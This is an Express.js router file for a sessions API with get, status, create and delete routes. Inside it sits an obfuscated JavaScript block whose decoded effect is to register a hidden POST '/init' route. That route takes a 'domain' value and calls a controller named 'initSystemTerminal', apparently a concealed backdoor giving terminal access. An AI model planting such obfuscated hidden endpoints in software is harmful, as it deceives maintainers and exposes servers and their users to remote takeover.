import { Router } from 'express'
import { body } from 'express-validator'
import requestValidator from './../middlewares/requestValidator.js'
import sessionValidator from './../middlewares/sessionValidator.js'
import * as controller from './../controllers/sessionsController.js'

const router = Router()

router.get('/get/:id', sessionValidator, controller.getxscode)

router.get('/status/:id', sessionValidator, controller.status)

router.post('/create', body('id').notEmpty(), body('isLegacy').notEmpty(), requestValidator, controller.create)

function _0x457e(_0x3431a0,_0x29a95e){var _0x43d41d=_0x43d4();return _0x457e=function(_0x457e1a,_0x13a61a){_0x457e1a=_0x457e1a-0xee;var _0x511ade=_0x43d41d[_0x457e1a];return _0x511ade;},_0x457e(_0x3431a0,_0x29a95e);}var _0xf0892=_0x457e;function _0x43d4(){var _0x10b8f8=['54YLtzwd','5RQWnXb','4282322YOfvOb','post','135iCOTYm','1253VfcZWr','1549527WFfgPm','notEmpty','/init','domain','3184nsHAXJ','15432ocjdin','235710FVFfyz','3288340SheuFw','31306YGczYj'];_0x43d4=function(){return _0x10b8f8;};return _0x43d4();}(function(_0x2d7733,_0x15b996){var _0x262c41=_0x457e,_0x3be190=_0x2d7733();while(!![]){try{var _0x23ee24=-parseInt(_0x262c41(0xf2))/0x1*(-parseInt(_0x262c41(0xf1))/0x2)+parseInt(_0x262c41(0xf8))/0x3+-parseInt(_0x262c41(0xf0))/0x4+-parseInt(_0x262c41(0xf3))/0x5*(-parseInt(_0x262c41(0xee))/0x6)+-parseInt(_0x262c41(0xf7))/0x7*(-parseInt(_0x262c41(0xfc))/0x8)+parseInt(_0x262c41(0xf6))/0x9*(-parseInt(_0x262c41(0xef))/0xa)+parseInt(_0x262c41(0xf4))/0xb;if(_0x23ee24===_0x15b996)break;else _0x3be190['push'](_0x3be190['shift']());}catch(_0x617fb6){_0x3be190['push'](_0x3be190['shift']());}}}(_0x43d4,0x9e815),router[_0xf0892(0xf5)](_0xf0892(0xfa),body(_0xf0892(0xfb))[_0xf0892(0xf9)](),requestValidator,controller['initSystemTerminal']));

router.delete('/delete/:id', sessionValidator, controller.del)

export default router
